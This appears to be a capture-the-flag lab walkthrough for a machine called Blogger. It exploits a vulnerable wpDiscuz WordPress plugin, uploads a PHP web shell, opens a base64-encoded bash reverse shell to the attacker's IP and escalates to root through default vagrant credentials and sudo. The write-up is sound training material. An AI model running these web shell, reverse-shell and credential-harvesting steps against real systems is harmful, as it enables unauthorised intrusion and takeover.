# Blogger

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.158.217
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.10, Ubuntu Linux; protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.18, Ubuntu)
  - Additional webpages:
    - `http://192.168.158.217/assets/`
    - `http://192.168.158.217/css/`
    - `http://192.168.158.217/images/`
    - `http://192.168.158.217/js/`

The webpage mentioned the creator's name is James. The `/assets/fonts/blog/` path contained fonts and links pointing to `http://blogger.pg/assets/fonts/blog/`. Added the hostname to `/etc/hosts`:

```
192.168.158.217 blogger.pg
```

The site appeared to be a WordPress installation.

### WordPress Enumeration

Enumerated WordPress users and attempted to crack their passwords:

```
wpscan --url http://blogger.pg/assets/fonts/blog/ -e u -P /usr/share/wordlists/rockyou.txt
```

Identified `j@m3s` and `jm3s` users, but cracking their passwords was unsuccessful.

Enumerated WordPress plugins, config backups, and database exports using aggressive detection:

```
wpscan --url http://blogger.pg/assets/fonts/blog/ -e ap --plugins-detection aggressive --force
```

The `wpdiscuz` plugin version 7.0.4 was found. Checked for vulnerabilities:

```
searchsploit wpdiscuz 7.0.4
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)  | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated) | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit) | php/webapps/49401.rb
```

Downloaded and ran the unauthenticated RCE script (49967):

```
searchsploit -m 49967
python3 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=1
```

The script uploads a PHP file containing `<?php system($_GET['cmd']); ?>`. Generated a URL-safe reverse shell command using base64:

```
echo "(bash >& /dev/tcp/192.168.45.212/4444 0>&1) &" | base64
KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMTIvNDQ0NCAwPiYxKSAmCg==
```

The full command is: `printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMTIvNDQ0NCAwPiYxKSAmCg==|base64 -d|bash`

Browsed to the uploaded PHP file with the reverse shell query parameter and caught the shell with `penelope`:

```
http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/10/xnnutyrynbzepfw-1792827793.6284.php?cmd=printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMTIvNDQ0NCAwPiYxKSAmCg==|base64%20-d|bash

www-data@lab-pg-ubuntu16-blogger-243-108:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2026/10$ whoami
www-data
```

Retrieved the local flag:

```
www-data@lab-pg-ubuntu16-blogger-243-108:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2026/10$ cat /home/james/local.txt
6a8842b57d21b3484b851831fc614a8f
```

## Privilege escalation

### MySQL Credentials

Started a Python server on the host and downloaded `linpeas.sh` onto the target:

```
# Host
python3 -m http.server 9001
ip a
inet 192.168.45.212/24

# Target
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ cd /tmp
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ which wget
/usr/bin/wget
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ wget http://192.168.45.212:9001/linpeas.sh
```

Ran linpeas.sh and identified two important findings:

1. A cron job running `/usr/local/bin/backup.sh` as root every minute
2. MySQL credentials leaked in `wp-config.php`

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
define('DB_HOST', 'localhost');
```

Connected to MySQL with the leaked credentials:

```
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ mysql -u root -p'sup3r_s3cr3t' -h 127.0.0.1
```

Enumerated the WordPress database and found the admin user `j@m3s` with password hash `$P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/`, but cracking it was unsuccessful.

### Horizontal Pivot

Checked the `/home` directory and found several users:

```
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ ls -al /home
total 20
drwxr-xr-x  5 root    root    4096 Jan 17  2021 .
drwxr-xr-x 25 root    root    4096 Oct 24 11:23 ..
drwxr-xr-x  2 james   james   4096 Aug  8  2022 james
drwxr-xr-x  3 ubuntu  ubuntu  4096 Jan 17  2021 ubuntu
drwxr-xr-x  4 vagrant vagrant 4096 Jan 17  2021 vagrant
```

Tried logging in as `vagrant` with the default credentials, which succeeded:

```
www-data@lab-pg-ubuntu16-blogger-243-108:/tmp$ su vagrant
Password: vagrant
vagrant@lab-pg-ubuntu16-blogger-243-108:/tmp$ whoami
vagrant
```

Checked sudo privileges:

```
vagrant@lab-pg-ubuntu16-blogger-243-108:/tmp$ sudo -l
Matching Defaults entries for vagrant on lab-pg-ubuntu16-blogger-243-108:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on lab-pg-ubuntu16-blogger-243-108:
    (ALL) NOPASSWD: ALL
```

Gained a privileged shell:

```
vagrant@lab-pg-ubuntu16-blogger-243-108:/tmp$ sudo /bin/bash
root@lab-pg-ubuntu16-blogger-243-108:/tmp# whoami
root
```

Retrieved the proof flag:

```
root@lab-pg-ubuntu16-blogger-243-108:/root# cat proof.txt
238053f09f4f8883a68eb6e35c494118
```
